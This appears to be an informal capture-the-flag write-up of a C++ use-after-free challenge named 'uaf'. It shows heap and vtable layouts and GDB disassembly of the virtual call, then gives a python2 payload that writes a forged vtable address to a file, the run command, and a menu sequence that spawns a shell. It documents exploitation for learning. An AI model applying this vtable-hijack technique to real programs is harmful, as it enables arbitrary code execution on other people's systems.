So I did a research about objects in cpp (got some knowledge as cpp developer) and found out that the object splits into two parts:the variables part and the pointers part.And even thogh i though that the size of the object is 48 (used sizeof() and compiled it) The actual size is 24 bytes.I marked the split with:||||0x6152c8:       0x6b63614a      0x00000      0x00000      0x00000 > the name Jack0x6152d8:       0x00021      0x00000 |||| 0x00401570      0x00000 > the 21 is the age and the second value is the vptr we need to change0x6152e8:       0x00019      0x00000      0x006152c8      0x00000 > pointer to the string0x6152f8:       0x00031 > object size+1 (indirect that the data before this also allocated)And by using gdb, we could understand that use is taking the base vtable pointer and adding 8 to it, so we could subtract 8 from the address and get this address 0x401568We could see in GDB:0x400fcd <main+265>    mov    rax, qword ptr [rbp - 0x38]     RAX, [0x7fffffffdb48] => 0x6152e0 --> 0x401570 (vtable for Man+16) ◂— jp 0x401583 > load the address of the vtable0x400fd1 <main+269>    mov    rax, qword ptr [rax]            RAX, [0x6152e0] => 0x401570 (vtable for Man+16) —▸ 0x40117a (Human::give_shell()) ◂— push rbp0x400fd4 <main+272>    add    rax, 8                          RAX => 0x401578 (vtable for Man+24) (0x401570 + 0x8)                              > offset of 8 to get to introduce()0x400fd8 <main+276>    mov    rdx, qword ptr [rax]            RDX, [vtable for Man+24] => 0x4012d2 (Man::introduce()) ◂— push rbp► 0x400fdb <main+279>    mov    rax, qword ptr [rbp - 0x38]     RAX, [0x7fffffffdb48] => 0x6152e0 --> 0x401570 (vtable for Man+16) ◂— jp 0x4015830x400fdf <main+283>    mov    rdi, rax                        RDI => 0x6152e0 --> 0x401570 (vtable for Man+16) —▸ 0x40117a (Human::give_shell())0x400fe2 <main+286>    call   rdx                         <Man::introduce()>                                                                    > call the functionWe need to allocate twice because of two reasons:1. we call `man` first in the `use` option of the switch function2. we use fast-bins and they act as link list so if we want to run man we allocate twiceSo we could put the address in a file using python/echo create a temp the dir to put the file in it python2 -c "print '\x68\x15\x40' + '\x00' *21" > /tmp/tmp/filesimply run ./uaf 24 /tmp/tmp/fileAnd the sequence 3 2 2 1 and we get a shell